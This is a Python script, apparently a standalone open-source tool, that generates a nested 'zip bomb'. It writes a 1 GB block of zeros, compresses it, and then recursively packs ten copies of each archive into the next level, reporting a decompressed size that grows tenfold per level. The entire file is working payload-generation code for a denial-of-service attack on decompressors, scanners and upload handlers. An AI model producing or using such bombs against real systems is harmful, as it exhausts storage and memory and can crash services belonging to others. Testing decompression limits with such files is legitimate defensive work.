"""
Copyright (c) 2020-2021 Vladimir Rogozin (vladimir20040609@gmail.com)
Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
or copy at http://opensource.org/licenses/MIT)
"""

#
# Import.
#

import os
import sys
import time

import zlib
import zipfile
import shutil


#
# Funcs.
#

def get_file_size(filename):
    stat = os.stat(filename)
    return stat.st_size

def generate_txt_block(filename, size):
    with open(filename, 'w') as file_raw:
        for i in range(1024):
            file_raw.write((size * 1024 * 1024) * '0')

def get_filename_without_extension(name):
    return name[:name.rfind('.')]

def get_extension(name):
    return name[name.rfind('.')+1:]

def compress_file(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()

def make_copies_and_compress(infile, outfile, num_of_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)

    for i in range(num_of_copies):
        f_name = '%s-%d.%s' % (get_filename_without_extension(infile), i, get_extension(infile))
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)

    zf.close()


#
# Main.
#

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage:\n')
        print(' ZipBomb_generator.py num_of_levels out_zip_file')
        exit()

    num_of_levels = int(sys.argv[1]) # '1' = 1.000.000 GB.
    out_zip_file = sys.argv[2] # Name of the bomb(with '.zip'), ex: bomb.zip.

    txt_block = 'txt_block.txt'

    start_time = time.time() # Starts calculating building time.

    generate_txt_block(txt_block, 1) # Generating a txt block.

    level_1_zip = '1.zip' # --------------------\/
    compress_file(txt_block, level_1_zip) # Getting compressed block.
    os.remove(txt_block) # ---------------------/\

    # Making copies.
    decompressed_size = 1
    for i in range(1, num_of_levels + 1): 
        make_copies_and_compress('%d.zip' % i, '%d.zip' % (i + 1), 10)
        decompressed_size *= 10
        os.remove('%d.zip' % i)

    # Removing old file if it's necessary.
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)

    os.rename('%d.zip' % (num_of_levels + 1), out_zip_file) # Renaming the bomb.

    end_time = time.time() # Finishing calculating building time.

    # Finishing.
    print('Compressed File Size: %.2f KB' % (get_file_size(out_zip_file) / 1024.0))
    print('Size After Decompression: %d GB' % decompressed_size)
    print('Generation Time: %.2fs' % (end_time - start_time))